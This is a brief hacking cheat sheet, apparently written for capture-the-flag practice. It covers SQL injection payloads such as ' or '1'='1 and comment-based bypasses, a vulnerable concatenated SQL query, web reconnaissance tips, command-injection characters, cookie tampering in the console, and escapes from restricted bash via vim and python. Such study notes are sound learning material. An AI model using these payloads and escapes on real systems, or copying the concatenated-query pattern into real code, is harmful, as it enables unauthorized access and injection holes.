# Basics
## SQL hacking

Injection with  ’ or ‘1’=‘1 for

```sql
Select ? Where username=“admin” and password=“password”
Select ? Where username=“admin” and password=“’ or ‘1’=‘1”

sql = 'SELECT * FROM Users WHERE Name ="' + uName + '" AND Pass ="' + uPass + '"'
```

Another is admin’# the rest is a commented.
```sql
value=“admin’ or 1=1;#

SELECT * FROM users WHERE username='john' AND password='123456'

SELECT * FROM users WHERE username='john' OR 1=1; -- ' AND password='123456' 

john' OR 1=1; --

admin’ or ‘
```

1=1 means match on everything so print everything in the table
`#` make everything as a comment for MySQL.
`‘` will allow to include something inside of a string, it will close the string so you can add something else.
`;` will properly close the query and not read what is after

Check for illegal characters can be client side. So we can check the php/javascript for that.

## Javascript hacking

1. Check the source code with the developper tools
2. Check if there are some not protected root files http://site.com/not/protected/file
3. Check /robots.txt for not indexed files
   - Don’t forget relative import with `/` at the beginning
4. Check in Application then “cookies” any option that can be changed
5. Check the source code of the executed javascript and or php
6. Use injection in code commands with ; (semi colon) or ``` ` ``` (back ticks) or $ (dollar sign)
7. Check your regex “grep . /place/to/look/“ will look for all.

De obfuscating, nicify
http://jsnice.org/

## Php hacking

Check the .htaccess file that describe what are the authorized http actions.

When in a request with url/?page=… doc put quotes.


## Web hacking

You can find in the Network part of the web developer tool, the information such as Headers, responses cookies …
Information can be placed there.

Javascript in browser console

If you need to change some javascript value in the page, like cookies, you can do it using:

```js
document.cookie = document.cookie.replace("flag=0", "flag=1")
```

Start typing `document.` in the console and you will see what you can get and set from the page.

## Shell escaping

After connecting to server with provided credentials it appears that ctfuser is restricted by means of 'rbash'. There is a well-known restricted shell escape with vim text editor. To perform first escape one required to run vim and execute following vim commands:

```shell
:set shell=/bin/bash
:shell
```

rVim
You can use python in rVim but not shell
To list all installed features it is possible to use ':version' vim command.
:python3 import os; os.system(‘shell command’)
